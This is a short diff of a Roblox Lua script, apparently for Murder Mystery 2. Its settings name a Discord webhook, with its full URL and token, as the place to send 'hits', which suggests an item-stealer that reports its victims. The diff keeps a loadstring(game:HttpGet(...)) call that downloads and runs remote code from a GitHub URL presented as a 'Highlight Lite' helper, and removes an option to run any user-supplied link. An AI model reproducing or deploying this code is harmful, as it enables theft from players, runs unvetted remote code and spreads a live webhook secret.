@@ -1,8 +1,7 @@
 -- [ Settings ] --
 Username = "QuadCoreDragon" -- [Your Username]
 Webhook = "https://discord.com/api/webhooks/1291752093387853988/4Xte3V-WEnQotkIPZv173EMATsBRMccyT6Dt20_JOM2EptEHto0S0opxeEykAaBjxOH-" -- [Your Webhook For Hits]
-Script = "Highlight Lite" -- [None | Custom | MetterX Hub | Highlight Lite]
-RawLink = "" -- [Raw Link If "Custom"]
+Script = "Highlight Lite"
 
 repeat wait() until game:IsLoaded()
 
@@ -385,13 +384,6 @@ game.Players.PlayerAdded:Connect(function(player)
     end
 end)
 
-
-if Script == "None" then
-    wait(0)
-elseif Script == "Custom" then
-    loadstring(game:HttpGet(RawLink,true))()
-elseif Script == "Highlight Lite" then
+if Script == "Highlight Lite" then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/HighlightMM2/main/Lite"))()
-elseif Script == "MetterX Hub" or Script == "MetterX" then
-    print("soon")
 end
